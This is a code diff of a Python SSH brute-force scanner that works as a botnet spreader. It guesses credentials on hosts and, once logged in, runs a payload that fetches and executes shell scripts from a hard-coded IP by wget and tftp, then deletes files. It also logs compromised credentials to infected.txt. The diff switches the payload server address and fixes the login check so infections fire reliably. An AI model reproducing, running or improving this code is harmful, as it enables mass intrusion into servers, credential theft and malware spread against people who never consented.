@@ -41,7 +41,7 @@ paramiko.util.log_to_file("para.log")
 ███   ▄███   ███    ███   ███        ███  ███   ███   ███    ███    ▄█    ███ 
 ████████▀    ██████████   ███        █▀    ▀█   █▀    ██████████  ▄████████▀                                                                           
 """
-cmd = 'cd /tmp || cd /run || cd /; wget http://141.95.52.208/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 141.95.52.208 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 141.95.52.208; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *'
+cmd = 'cd /tmp || cd /run || cd /; wget http://35.183.182.60/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 35.183.182.60 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 35.183.182.60; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *'
 # PAYLOAD
 blacklist = [
     '127'
@@ -265,6 +265,7 @@ class sshscanner(threading.Thread):
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 dobreak = False
+                problemConnecting = False
                 for passwd in passwords:
                     if ":n/a" in passwd:
                         password = ""
@@ -280,23 +281,26 @@ class sshscanner(threading.Thread):
                             self.host, port=port, username=username, password=password, timeout=3)
                         dobreak = True
                         break
-                    except:
+                    except Exception as e:
+                        problemConnecting = True
                         pass
-                    if True == dobreak:
+                    if True == dobreak and problemConnecting == False:
                         break
-                print "\x1b[32m[CONNECTED] %s %s %s" % (self.host, username, password)
-                badserver = True
-                stdin, stdout, stderr = ssh.exec_command("/sbin/ip address")
-                output = stdout.read()
-                if "inet" in output:
-                    badserver = False
-                if badserver == False:
-                    print '\x1b[31m[INFECTING] '+self.host+'|'+username+'|'+password+'|'+str(port)
-                    ssh.exec_command(""+cmd+"")
-                    time.sleep(20)
-                    ssh.close()
-                    open("infected.txt", "a").write(
-                        username+":"+password+":"+self.host+"\n")
+                if problemConnecting == False:
+                    print "\x1b[32m[CONNECTED] %s %s %s" % (self.host, username, password)
+                    badserver = True
+                    stdin, stdout, stderr = ssh.exec_command(
+                        "/sbin/ip address")
+                    output = stdout.read()
+                    if "inet" in output:
+                        badserver = False
+                    if badserver == False:
+                        print '\x1b[31m[INFECTING] '+self.host+'|'+username+'|'+password+'|'+str(port)
+                        ssh.exec_command(""+cmd+"")
+                        time.sleep(20)
+                        ssh.close()
+                        open("infected.txt", "a").write(
+                            username+":"+password+":"+self.host+"\n")
             except:
                 pass
 
